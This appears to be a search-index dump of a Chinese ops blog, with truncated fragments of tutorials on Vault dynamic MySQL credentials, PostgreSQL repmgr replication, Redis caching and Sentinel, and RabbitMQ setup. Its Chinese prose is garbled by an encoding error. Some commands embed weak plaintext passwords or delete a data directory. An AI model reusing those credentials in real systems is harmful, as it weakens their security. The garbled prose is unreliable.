æ›´æ–°æ•°æ®åº“é…ç½®æ”¯æŒé™æ€è§’è‰² /opt/vault/bin/vault write database/config/mysql-vault \\ plugin_name=mysql-database-plugin \\ connection_url=\"{{username}}:{{password}}@tcp(127.0.0.1:3306)/\" \\ allowed_roles=\"vault-dynamic-role,app-static-user\" \\ username=\"root\" \\ password=\"rootpassword123\" # é…ç½®é™æ€è§’è‰²ï¼ˆ24å°æ—¶è‡ªåŠ¨è½®æ¢ï¼‰ /opt/vault/bin/vault write database/static-roles/app-static-user \\ db_name=mysql-vault \\ username=\"vault_static_user\" \\ rotation_statements=\"ALTER USER 'vault_static_user'@'%' IDENTIFIED BY '{{password}}';\" \\ rotation_period=\"86400\" 3.3 è·å–é™æ€å‡­æ® # è·å–å½“å‰é™æ€å‡­æ® /opt/vault/bin/vault read database/static-creds/app-static-user # æŸ¥çœ‹é™æ€è§’è‰²çŠ¶æ€ /opt/vault/bin/vault read database/static-roles/app-static-user ğŸ“Š é˜¶æ®µ4ï¼šç›‘æ§å®¡è®¡ä½“ç³» 4.1 å®¡è®¡æ—¥å¿—é…ç½® # åˆ›å»ºå®¡è®¡æ—¥å¿—ç›®å½• sudo mkdir -p /opt/vault/audit sudo chown cxd: /opt/vault/audit # å¯ç”¨æ–‡ä»¶å®¡è®¡ /opt/vault/bin/vault audit enable file file_path=/opt/vault/audit/vault-audit.log # éªŒè¯å®¡è®¡é…ç½® /opt/vault/bin/vault audit list 4.2 ç›‘æ§ç­–ç•¥é…ç½® # åˆ›å»ºæ•°æ®åº“ç›‘æ§ç­–ç•¥ /opt/vault/bin/vault policy write db-monitor - \u003c\u003c EOF path \"database/creds/vault-dynamic-role\" { capabilities = [\"read\"] } path \"database/creds/dev-readonly\" { capabilities = [\"read\"] } path \"database/creds/app-rw\" { capabilities = [\"read\"] } path \"database/roles/*\" { capabilities = [\"read\"] } path \"database/static-creds/app-static-user\" { capabilities = [\"read\"] } path \"sys/leases/renew\" { capabilities = [\"update\"] } path \"sys/leases/lookup\" { capabilities = [\"update\"] } EOF # åˆ›å»ºç›‘æ§ä»¤ç‰Œ /opt/vault/bin/vault token create -policy=db-monitor -display-name=\"db-monitor-token\" -ttl=24h 4.3 ç›‘æ§è„šæœ¬ ç§Ÿçº¦ç®¡ç†è„šæœ¬ (/opt/vault/bin/lease-manager.sh) #!/bin/bash export VAULT_ADDR='http://127.0.0.1:8200' echo \"=== Vaultç§Ÿçº¦ç®¡ç† ===\" # åˆ—å‡ºæ‰€æœ‰åŠ¨æ€å‡­æ®ç§Ÿçº¦ echo \"1. æ´»è·ƒçš„åŠ¨æ€å‡­æ®ç§Ÿçº¦:\" /opt/vault/bin/vault list sys/leases/lookup/database/creds/vault-dynamic-role 2\u003e/dev/null # æŸ¥çœ‹ç§Ÿçº¦è¯¦æƒ…ï¼ˆå¦‚æœæœ‰ç§Ÿçº¦ï¼‰ LEASE_IDS=$(/opt/vault/bin/vault list sys/leases/lookup/database/creds/vault-dynamic-role 2\u003e/dev/null | tail -n +3) if [ ! -z \"$LEASE_IDS\" ]; then echo -e \"\\n2. ç§Ÿçº¦è¯¦æƒ…:\" for lease in $LEASE_IDS; do echo \"ç§Ÿçº¦: $lease\" /opt/vault/bin/vault lease lookup database/creds/vault-dynamic-role/$lease 2\u003e/dev/null | grep -E \"(lease_duration|expire_time)\" done fi # æ£€æŸ¥MySQLä¸­çš„åŠ¨æ€ç”¨æˆ· echo -e \"\\n3. MySQLä¸­çš„åŠ¨æ€ç”¨æˆ·:\" docker exec mysql-vault-test mysql -uroot -prootpassword123 -e \"SELECT user, host FROM mysql.user WHERE user LIKE 'v-%';\" 2\u003e/dev/nu","date":"2025-11-18","objectID":"/posts/linux/vault%E7%9A%84mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE%E5%8A%A8%E6%80%81%E7%AE%A1%E7%90%86/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ","other"],"title":"HashiCorp Vaultçš„MySQLæ•°æ®åº“å‡­æ®åŠ¨æ€ç®¡ç†","uri":"/posts/linux/vault%E7%9A%84mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE%E5%8A%A8%E6%80%81%E7%AE%A1%E7%90%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"PostgreSQLä¸»ä»å¤åˆ¶åŠrepmgré«˜å¯ç”¨","date":"2025-08-29","objectID":"/posts/linux/pgsql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8Arepmgr%E9%AB%98%E5%8F%AF%E7%94%A8/","tags":["linux","è§£å†³æ–¹æ¡ˆ","åŒæ­¥"],"title":"PostgreSQLä¸»ä»å¤åˆ¶åŠrepmgré«˜å¯ç”¨","uri":"/posts/linux/pgsql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8Arepmgr%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æœ¬æ–‡ä¸ºPostgreSQLä¸»ä»å¤åˆ¶åŠrepmgré«˜å¯ç”¨è§£å†³æ–¹æ¡ˆ, å•ä¸»ä»æ¶æ„, é€‚ç”¨äºä¸­å°å‹æ•°æ®åº“é›†ç¾¤ã€‚æ–‡ä¸­è®°å½•ä¸ºçœŸæ˜¯åœºæ™¯æµ‹è¯•æ¡ˆä¾‹(æœªè¿›è¡Œå‚æ•°ä¼˜åŒ–)ï¼Œé›†ç¾¤äºäºšé©¬é€ŠEC2ï¼ŒVIPèƒ½åŠ›ç”±äºšé©¬é€Šç§æœ‰è¾…åŠ©IPå®ç° åŸºç¡€ç¯å¢ƒä¿¡æ¯ æ“ä½œç³»ç»Ÿ: Ubuntu 24.04.3ã€4Gã€8vCPUã€500G PostgreSQL: 16.10 Repmgr: 5.5.0 èŠ‚ç‚¹ä¿¡æ¯: ä¸»-pgsql_node_01(10.0.2.113)ã€ä»-pgsql_node_02(10.0.3.114) VIP: 10.0.1.100 èµ„æºç¯å¢ƒ: AWS EC2 ç¯å¢ƒæ­å»º å®‰è£…åŠé…ç½® # åœ¨ä¸¤å°æœºå™¨åŒæ—¶æ‰§è¡Œ $\u003e sudo apt update $\u003e sudo apt install -y postgresql-common $\u003e sudo /usr/share/postgresql-common/pgdg/apt.postgresql.org.sh # å®‰è£… PostgreSQL 16ã€repmgrï¼Œ æ­¤ä¸¾å°†å®‰è£…æœ€æ–°ç‰ˆçš„ PostgreSQL 16æœ€æ–°ç‰ˆæœ¬ï¼Œæˆªæ­¢æ–‡æ¡£ç¼–å†™ # PostgreSQL æœ€æ–°ç‰ˆæœ¬ä¸º 16.10 $\u003e sudo apt install -y postgresql-16 postgresql-client-16 postgresql-16-repmgr jq curl # ç‰ˆæœ¬éªŒè¯ $\u003e psql --version # å®¢æˆ·ç«¯ç‰ˆæœ¬ $\u003e sudo -u postgres psql -c 'SELECT version();' # æœåŠ¡å™¨ç‰ˆæœ¬ $\u003e pg_lsclusters # æŸ¥çœ‹é›†ç¾¤åˆ—è¡¨ä¸ç›‘å¬ç«¯å£ $\u003e systemctl status postgresql@16-main PostgreSQL æ•°æ®ç›®å½•è¿ç§» æ­¤é¡¹æ ¹æ®è‡ªå·±éœ€æ±‚çœ‹æ˜¯å¦è°ƒæ•´ï¼Œå¯å¿½ç•¥æ­¤æ­¥éª¤ # åœæ­¢ç°æœ‰é›†ç¾¤ sudo pg_ctlcluster 16 main stop # å‡†å¤‡æ–°ç›®å½• sudo mkdir -p /data/_pgsql_data/16/main sudo chown postgres:postgres /data/_pgsql_data -R # ä½¿ç”¨ initdb åˆå§‹åŒ–åˆ°æ–°ç›®å½• sudo -u postgres /usr/lib/postgresql/16/bin/initdb -D /data/_pgsql_data/16/main # åˆ‡æ¢é…ç½®åˆ°æ–°ç›®å½• sudo sed -i \"s|^#\\?data_directory =.*|data_directory = '/data/_pgsql_data/16/main'|\" /etc/postgresql/16/main/postgresql.conf # 5) å¯åŠ¨å¹¶éªŒè¯ sudo pg_ctlcluster 16 main start pg_lsclusters åˆå§‹åŒ–ä¸ä¸»ä»å¤åˆ¶ é…ç½®æ–‡ä»¶ postgresql.conf ä¸»ã€ä»èŠ‚ç‚¹åŒæ—¶æ‰§è¡Œ $\u003e vim /etc/postgresql/16/main/postgresql.conf listen_addresses = '*' wal_level = replica max_wal_senders = 10 max_replication_slots = 10 hot_standby = on wal_keep_size = 512MB # è¯¥å€¼ç†è®ºä¸Šåº”è¯¥é€šè¿‡è®¡ç®—å¾—å‡ºï¼Œä½†å½“å‰åº“ä¸»è¦ç”¨äºæµ‹è¯•å’Œè¯»å– 512 æ˜¯ä¸€ä¸ªç•¥å¾®åˆç†çš„å€¼ shared_buffers = 2GB # æ¨èç³»ç»Ÿå†…å­˜çš„25%(8G) password_encryption = scram-sha-256 # æ—¥å¿—ä¸æ…¢æŸ¥è¯¢ logging_collector = on log_directory = 'log' # Debianç³»åˆ— é»˜è®¤ç¬¦å·é“¾æ¥åˆ° /var/log/postgresql log_filename = 'postgresql-%Y-%m-%d.log' log_rotation_age = 1d log_rotation_size = 10MB log_line_prefix = '%m [%p] %u@%d %r ' # æ—¶é—´, PID, ç”¨æˆ·@åº“, è¿œç«¯åœ°å€ log_statement = 'ddl' # è®°å½• DDL log_duration = off log_min_duration_statement = 500ms # æ…¢æŸ¥è¯¢é˜ˆå€¼ # repmgr ä¸»ä»åˆ‡æ¢è¦æ±‚å½’æ¡£ archive_mode = on # # è¿™ä¸ªç›®å½•éœ€è¦ä¸»åŠ¨ç»´æŠ¤ # mkdir -p /data/_pgsql_data/wal_archive \u0026\u0026 chown postgres:postgres /data/_pgsql_data/wal_archive archive_command = 'cp %p /data/_pgsql_data/wal_archive/%f' shared_preload_libraries = 'repmgr' wal_log_hints = on shared_preload_libraries = 'repmgr' # é‡å¯ postgresql $\u003e sudo systemctl restart postgresql@16-main åˆ›å»ºå¤åˆ¶ä¸ç®¡ç†ç”¨æˆ· # ä¸»èŠ‚ç‚¹-pgsql_node_01(10.0.2.113)æ‰§è¡Œ $\u003e sudo -u postgres psql postgres=# CREATE USER repl WITH REPLICATION LOGIN PASSWORD '{{ REPL_PASSWORD }}'; é…ç½®æ–‡ä»¶ pg_hba.conf # ä¸»ã€ä»ç¯å¢ƒåŒæ—¶æ‰§è¡Œ $\u003e vim /etc/postgresql/16/main/pg_hba.conf host all all 10.0.0.0/16 scram-sha-256 host replication repl 10.0.0.0/16 scram-sha-256 ä»åº“åŸºå‡†æ‹·è´ # ä»èŠ‚ç‚¹ pgsql_node_02(10.0.3.114) æ‰§è¡Œ $\u003e sudo systemctl stop postgresql@16-main $\u003e sudo rm -rf /data/_pgsql_data/16/main # æ‰§è¡Œ basebackupï¼š $\u003e sudo -u postgres pg_basebackup -h 10.0.2.113 -U repl -D /data/_pgsql_data/16/main -Fp -Xs -P -R # -R ä¼šè‡ªåŠ¨å†™å…¥ standby.signal ä¸ primary_conninfo # å¯åŠ¨ä»åº“ $\u003e sudo systemctl start postgresql@16-main # éªŒè¯å¤åˆ¶ï¼š # åœ¨ 10.0.2.113/20 æŸ¥çœ‹ state åº”ä¸º streamingï¼Œ sync_state åº”ä¸º async, è‹¥å¼€å¯å¼ºä¸€è‡´æ€§ sync_state åº”ä¸º sync # synchronous_commit: ## onï¼šäº‹åŠ¡æäº¤æ—¶ç­‰å¾… WAL æ—¥å¿—ä¼ è¾“å¹¶ç¡®è®¤å†™å…¥åˆ°åŒæ­¥ standbyã€‚ ## remote_writeï¼šåªç­‰å¾…ä»åº“ç¡®è®¤å†™å…¥ WALï¼Œä½†ä¸ç­‰å¾… fsyncï¼ˆæ€§èƒ½ç¨å¥½ï¼Œä½†ä»æœ‰ä¸¢æ•°æ®é£é™©ï¼‰ã€‚ ## remote_applyï¼šç­‰åˆ° standby çœŸæ­£åº”ç”¨äº†äº‹åŠ¡æ‰è¿”å›ï¼ˆæœ€å¼ºä¸€è‡´æ€§ï¼Œä½†å»¶è¿Ÿæœ€å¤§ï¼‰ã€‚ # synchronous_commit = on # synchronous_standby_names # æŒ‡å®šå“ªäº›ä»åº“æ˜¯åŒæ­¥å¤åˆ¶å€™é€‰è€…ã€‚ # FIRST 1 (...) è¡¨ç¤ºä¸»åº“åªéœ€è¦ ä»»æ„ 1 ä¸ª standby ç¡®è®¤å°±ç®—æˆåŠŸã€‚ # å¯ä»¥åˆ—å‡ºå¤šä¸ªï¼Œä»åº“åéœ€è¦å’Œä»åº“çš„ primary_conninfo é‡Œçš„ application_name åŒ¹é…ã€‚ # synchronous_standby_names = 'FIRST 1 (standby1, standby2)' # å…³äºå¼ºä¸€è‡´æ€§æ˜¯å¦å¼€å¯, ä¸»åº“äº‹åŠ¡æäº¤å‰å¿…é¡»ç­‰å¾…è‡³å°‘ä¸€ä¸ªåŒæ­¥å¤‡åº“ç¡®è®¤å†™å…¥ WALï¼Œç¡®ä¿å³ä½¿ä¸»åº“å´©æºƒï¼Œæ•°æ®ä¹Ÿå·²ç»æŒä¹…åŒ–åˆ°å¤‡åº“ã€‚ # å› æ­¤å•ä¸»å•ä»èŠ‚ç‚¹æ˜¯ä¸å»ºè®®å¼€å¯çš„ï¼Œ å¦åˆ™ä»åº“ç¦»çº¿ï¼Œä¸»åº“å¯èƒ½å°†ä¸€ç›´å¤„äºç­‰å¾…çŠ¶æ€ã€‚ $\u003e sudo -u postgres psql -c \"select client_addr, state, sync_state from pg_stat_replication;\" # åœ¨ 10.0.3.114/20 æŸ¥çœ‹ï¼Œåº”ä¸º t $\u003e sudo -u postgres psql -c \"select pg_is_in_recovery();\" ä¸»ä»å¤åˆ¶å®Œæˆ repmgr æœåŠ¡é…ç½® repmgr æ•°æ®åº“ã€ç”¨æˆ·ã€æˆæƒã€æ‰©å±• -- # ä¸»èŠ‚ç‚¹-pgsql_node_01(10.0.2.113)æ‰§è¡Œï¼Œåˆ›å»ºç›¸å…³ç”¨æˆ·(ç”±äºä¸»ä»å¤åˆ¶å®Œæˆï¼Œä»åº“ä¼šè‡ªåŠ¨åŒæ­¥è¿™äº›ä¿¡æ¯) $\u003e sudo -u postgres psql # -- ç¡®ä¿åœ¨å¹²å‡€çš„ç¯å¢ƒä¸­å¼€å§‹ï¼Œå¦‚æœ repmgr æ•°æ®åº“å’Œç”¨æˆ·å·²å­˜åœ¨ï¼Œåˆ™åˆ é™¤å®ƒä»¬ã€‚ postgres=# DROP DATABASE IF EXISTS repmgr; postgres=# DROP ROLE IF EXISTS repmgr; # -- 3. æˆäºˆ repmgr ç”¨æˆ·å¯¹ repmgr æ•°æ®åº“çš„æ‰€æœ‰æƒé™ã€‚ # -- æ­£å¸¸æ¥è¯´ï¼Œæ­¤å¤„ä½¿ç”¨çš„æˆæƒ","date":"2025-08-29","objectID":"/posts/linux/pgsql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8Arepmgr%E9%AB%98%E5%8F%AF%E7%94%A8/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ","åŒæ­¥"],"title":"PostgreSQLä¸»ä»å¤åˆ¶åŠrepmgré«˜å¯ç”¨","uri":"/posts/linux/pgsql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8Arepmgr%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"categories":null,"content":"Redisé«˜å¹¶å‘å¸¸è§3å¤§é—®é¢˜ ç¼“å­˜ç©¿é€ã€ç¼“å­˜å‡»ç©¿ã€ç¼“å­˜é›ªå´©","date":"2025-05-20","objectID":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/","tags":null,"title":"Redisé«˜å¹¶å‘å¸¸è§3å¤§é—®é¢˜","uri":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/"},{"categories":null,"content":"ç¼“å­˜ç©¿é€ ä»–æ˜¯æŒ‡å¤§é‡è¯·æ±‚è®¿é—®çš„æ•°æ®ï¼Œåœ¨ç¼“å­˜å’Œæ•°æ®åº“ä¸­å‡ä¸å­˜åœ¨ï¼Œå¯¼è‡´è¯·æ±‚ç›´æ¥ç©¿é€ç¼“å­˜å±‚ï¼Œé¢‘ç¹è®¿é—®æ•°æ®åº“ï¼Œé€ æˆæ•°æ®åº“å‹åŠ›è¿‡å¤§ï¼Œå“åº”è¿‡æ…¢ï¼Œç”šè‡³å®•æœºã€‚å…¶åŸå› å¯èƒ½æ˜¯é»‘å®¢æ„é€ å¤§é‡ä¸å­˜åœ¨çš„keyå‘é€è¯·æ±‚ï¼Œæˆ–è€…ä¸šåŠ¡ä»£ç é€»è¾‘bugï¼ŒæŸ¥è¯¢äº†å¤§é‡keyä¸å­˜åœ¨æˆ–è€…æ— æ•ˆæ•°æ®ã€‚ è§£å†³æ–¹æ¡ˆ åœ¨æ•°æ®æŸ¥è¯¢ä¸åˆ°æ•°æ®æ—¶ï¼Œå‘redisç¼“å­˜ä¸€ä¸ªç©ºå€¼ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªè¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´(æ¯”å¦‚5åˆ†é’Ÿ)ï¼Œè¿™æ ·ä¸‹æ¬¡è¯·æ±‚ç›¸åŒçš„keyæ—¶å°±èƒ½å‘½ä¸­ç¼“å­˜ï¼Œå°†ç©ºå€¼è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ ä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨å¯¹æ‰€æœ‰çš„keyè¿›è¡Œé¢„åˆ¤ï¼Œå¯¹äºä¸å­˜åœ¨çš„keyï¼Œç›´æ¥è¿”å›æˆ–æ‹’ç»è¯·æ±‚ï¼Œåªæœ‰å­˜åœ¨çš„keyæ‰ä¼šå»æŸ¥è¯¢ç¼“å­˜ å¯¹è¯·æ±‚å‚æ•°è¿›è¡Œæ ¡éªŒï¼Œè¿‡æ»¤æ‰æ˜æ˜¾æ— æ•ˆçš„è¯·æ±‚ï¼Œå¦‚IDæ ¼å¼å¿…é¡»åˆæ³•ç­‰ï¼Œåªæœ‰åˆæ³•çš„IDæ‰ä¼šå»æŸ¥è¯¢ç¼“å­˜ ç¼“å­˜å‡»ç©¿ ä»–æ˜¯æŒ‡æŸä¸ªçƒ­ç‚¹æ•°æ®åœ¨ç¼“å­˜ä¸­è¿‡æœŸï¼Œå¯¼è‡´å¤§é‡è¯·æ±‚åŒæ—¶è®¿é—®æ•°æ®åº“ï¼Œé€ æˆæ•°æ®åº“ç¬é—´å‹åŠ›è¿‡å¤§ï¼Œç”šè‡³æœåŠ¡ä¸å¯ç”¨ è§£å†³æ–¹æ¡ˆ å¯¹äºæ ¸å¿ƒçƒ­ç‚¹æ•°æ®ï¼Œå¯ä»¥è®¾ç½®æ°¸ä¸è¿‡æœŸï¼Œæˆ–è€…ä½¿ç”¨å®šæ—¶ä»»åŠ¡å®šæœŸæ›´æ–°ç¼“å­˜ï¼Œç¡®ä¿çƒ­ç‚¹æ•°æ®å¯ä»¥å‘½ä¸­ç¼“å­˜ åœ¨ç¼“å­˜å¤±æ•ˆæ—¶ï¼Œä½¿ç”¨åˆ†å¸ƒå¼é”(å¦‚redisçš„setnx)ä¿è¯åªæœ‰ä¸€ä¸ªè¯·æ±‚å»æŸ¥è¯¢æ•°æ®åº“ï¼Œå…¶ä»–è¯·æ±‚ç­‰å¾…ï¼Œè¯¥è¯·æ±‚æŸ¥è¯¢åˆ°æ•°æ®åº“ååœ¨æ›´æ–°åˆ°ç¼“å­˜ä¸­ï¼Œè¿™æ ·åç»­è¯·æ±‚å°±åˆèƒ½å‘½ä¸­ç¼“å­˜äº† ç¼“å­˜é›ªå´© ä»–æ˜¯æŒ‡å¤§é‡ç¼“å­˜æ•°æ®åœ¨åŒä¸€æ—¶é—´ç‚¹è¿‡æœŸï¼Œå¯¼è‡´å¤§é‡è¯·æ±‚ç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œé€ æˆæ•°æ®åº“å´©æºƒï¼Œå¯èƒ½çš„åŸå› æ˜¯è®¾ç½®äº†ç›¸åŒçš„è¿‡æœŸæ—¶é—´ï¼Œæˆ–è€…redisæœåŠ¡å™¨å®•æœºæˆ–è€…é‡å¯ è§£å†³æ–¹æ¡ˆ è®¾ç½®ä¸åŒçš„è¿‡æœŸæ—¶é—´ï¼Œé¿å…å¤§é‡æ•°æ®åŒæ—¶è¿‡æœŸ ç¼“å­˜é¢„çƒ­ï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œæå‰å°†çƒ­ç‚¹æ•°æ®åŠ è½½åˆ°ç¼“å­˜ä¸­ ç†”æ–­é™çº§ï¼Œä½¿ç”¨ç†”æ–­å™¨(å¦‚Hystrix)å¯¹è¯·æ±‚è¿›è¡Œé™æµï¼Œé™åˆ¶æ•°æ®åº“è®¿é—®é‡ï¼Œå½“æ•°æ®åº“å‹åŠ›è¿‡å¤§æ—¶å€™ï¼Œç›´æ¥è¿”å›é»˜è®¤å€¼æˆ–é”™è¯¯æç¤º ","date":"2025-05-20","objectID":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/:0:0","tags":null,"title":"Redisé«˜å¹¶å‘å¸¸è§3å¤§é—®é¢˜","uri":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"RabbitMQå•æœºç¯å¢ƒæ­å»º","date":"2024-12-31","objectID":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"RabbitMQå•æœºç¯å¢ƒæ­å»º","uri":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" å‰è¨€ æœ¬æ–‡å†…å®¹åŸºäº Alibaba CloudLinux 3 æ“ä½œç³»ç»Ÿéƒ¨ç½²ã€æµ‹è¯• Erlang 26.2.5.6-1 RabbitMQ 3.13.7-1 RabbitMQ å•æœºéƒ¨ç½² å®‰è£… å®‰è£…ä¾èµ–ç¯å¢ƒ $\u003e dnf install unixODBC unixODBC-devel SDL make gcc gcc-c++ kernel-devel m4 ncurses-devel openssl-devel -y é€šè¿‡RPMåŒ…ï¼Œå®‰è£…erlangå’Œrabbitmqã€‚RabbitMQæ˜¯åŸºäºErlangè¯­è¨€ç¼–å†™çš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆå®‰è£…Erlang(å¦: ä¸åŒç‰ˆæœ¬çš„RabbitMQæ‰€ä½¿ç”¨çš„Erlangç‰ˆæœ¬ä¸ä¸€æ ·,æ³¨æ„è‡ªè¡Œåˆ¤æ–­)ã€‚ $\u003e dnf install erlang-26.2.5.6-1.el8.x86_64.rpm rabbitmq-server-3.13.7-1.el8.noarch.rpm -y é…ç½® å¯åŠ¨ RabbitMQ $\u003e systemctl start rabbitmq-server.service å¯åŠ¨ RabbitMQ çš„ Web UI ç•Œé¢, æœ‰ä¸€ä¸ªé»˜è®¤å¸å·(guest/guest), ä½†è¯¥å¸å·ä»…é™äºæœ¬åœ°ç™»é™†ä½¿ç”¨ http://localhost:15672 $\u003e rabbitmq-plugins enable rabbitmq_management Enabling plugins on node rabbit@b05eab96337f: rabbitmq_management The following plugins have been configured: rabbitmq_management rabbitmq_management_agent rabbitmq_web_dispatch Applying plugin configuration to rabbit@b05eab96337f... The following plugins have been enabled: rabbitmq_management rabbitmq_management_agent rabbitmq_web_dispatch started 3 plugins. ä¿®æ”¹ RabbitMQ ç”¨æˆ·ä¿¡æ¯ $\u003e rabbitmqctl list_users # æŸ¥çœ‹å·²æœ‰çš„ç”¨æˆ· Listing users ... user tags guest [administrator] $\u003e rabbitmqctl list_permissions # æ˜¾ç¤ºæ¯ä¸ªç”¨æˆ·åœ¨ RabbitMQ ä¸­çš„å„ç§æƒé™ Listing permissions for vhost \"/\" ... user configure write read guest .* .* .* $\u003e rabbitmqctl delete_user guest # åˆ é™¤é»˜è®¤çš„ guest ç”¨æˆ·ï¼Œé˜²æ­¢æœªç»æˆæƒçš„è®¿é—® Deleting user \\\"guest\\\" ... # rabbitmqctl add_user \u003cusername\u003e \u003cpassword\u003e $\u003e rabbitmqctl add_user admin admin@123 # åˆ›å»ºæ–°çš„ç”¨æˆ· Adding user \"admin\" ... Done. Don\\'t forget to grant the user permissions to some virtual hosts! See 'rabbitmqctl help set_permissions' to learn more. $\u003e rabbitmqctl set_user_tags admin administrator # ç”¨äºèµ‹äºˆç”¨æˆ·ç‰¹å®šçš„è§’è‰²æˆ–æƒé™çº§åˆ«çš„æ ‡ç­¾ Setting tags for user \"admin\" to [administrator] ... $\u003e rabbitmqctl set_permissions admin \".*\" \".*\" \".*\" # è®¾ç½®æƒé™ã€‚è¿™é‡Œçš„ä¸‰ä¸ª\".*\"åˆ†åˆ«å¯¹åº”é…ç½®ï¼ˆconfigureï¼‰æƒé™ã€å†™å…¥ï¼ˆwriteï¼‰æƒé™å’Œè¯»å–ï¼ˆreadï¼‰æƒé™ã€‚\".*\"æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œè¡¨ç¤ºå¯¹æ‰€æœ‰èµ„æºï¼ˆå¦‚æ‰€æœ‰é˜Ÿåˆ—ã€äº¤æ¢å™¨ç­‰ï¼‰éƒ½èµ‹äºˆç›¸åº”çš„æƒé™ã€‚ Setting permissions for user \"admin\" in vhost \"/\" ... ","date":"2024-12-31","objectID":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"RabbitMQå•æœºç¯å¢ƒæ­å»º","uri":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Redisä¸»ä»å¤åˆ¶+å“¨å…µ","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/","tags":["linux","è§£å†³æ–¹æ¡ˆ","åŒæ­¥"],"title":"Redisä¸»ä»å¤åˆ¶+å“¨å…µ","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. æµ‹è¯•ç‰ˆæœ¬: redis 6.2.14 $\u003e make PREFIX=/opt/redis-server/6.2.14 install $\u003e mkdir -p /opt/redis-server/6.2.14/{data,logs,etc} $\u003e mkdir -p /opt/redis-server/6.2.14/sentinel_data/26379 1.1 é…ç½®æ–‡ä»¶é¢å¤–ä¿®æ”¹ä»¥ä¸‹å‚æ•°(å¤šå°‘ä¸ªèŠ‚ç‚¹ï¼Œå¤šå°‘ä¸ªç‹¬ç«‹é…ç½®æ–‡ä»¶) # é…ç½® redis.conf masterauth \u003cpassword\u003e # ä¸redis.confä¸­å¯†ç ä¸€è‡´(æ­¤é¡¹åœ¨æ¯ä¸ªèŠ‚ç‚¹éƒ½è¦é…ç½®) slaveof \u003cmasterip\u003e \u003cmasterport\u003e # æŒ‡å®šä¸»èŠ‚ç‚¹ipå’Œç«¯å£(æ­¤é¡¹åªåœ¨ä»èŠ‚ç‚¹ä¸Šè¿›è¡Œé…ç½®) # é…ç½® sentinel.conf port: \u003cport\u003e # 21 pidfile: /pathto/sentinel_\u003cport\u003e.pid # 31 logfile: /pathto/logs/sentinel_\u003cport\u003e.log # 36 dir: /path/sentinel_data/\u003cport\u003e # 64 ## \u003cmaster-name\u003e ä¸»èŠ‚ç‚¹åç§°, å¯ä»¥è‡ªå®šä¹‰ ## \u003cmaster-ip\u003e \u003cmaster-port\u003e ä¸»èŠ‚ç‚¹ipå’Œç«¯å£ ## \u003cquorum\u003e æŒ‡å®šéœ€è¦æœ‰2ä¸ªä»¥ä¸ŠsentinelèŠ‚ç‚¹è®¤ä¸ºredisä¸»èŠ‚ç‚¹å¤±æ•ˆ, æ‰æ˜¯çœŸçš„å¤±æ•ˆ, ä¸€èˆ¬ä¸º: sentinelæ€»æ•°/2+1 sentinel monitor \u003cmaster-name\u003e \u003cmaster-ip\u003e \u003cmaster-port\u003e \u003cquorum\u003e # 84 , æ­¤é¡¹æ¯ä¸ªèŠ‚ç‚¹éƒ½è¦é…ç½® sentinel auth-pass mymaster \u003cpassword\u003e # 105 æ’å…¥ æ­¤é¡¹, ä¸redis.confä¸­å¯†ç ä¸€è‡´(æ­¤é¡¹åœ¨æ¯ä¸ªèŠ‚ç‚¹éƒ½è¦é…ç½®) sentinel down-after-milliseconds mymaster 30000 # 125 æ­¤é¡¹æ˜¯æŒ‡å®š ä¸»æœºèŠ‚ç‚¹å¤šå°‘æ¯«ç§’æ— å“åº”ï¼Œåˆ™è®¤ä¸ºæŒ‚äº†, é»˜è®¤30s ## ä¸»å¤‡åˆ‡æ¢æ—¶, æœ€å¤šæœ‰å¤šå°‘ä¸ªslaveåŒæ—¶å¯¹æ–°çš„masterè¿›è¡ŒåŒæ­¥, 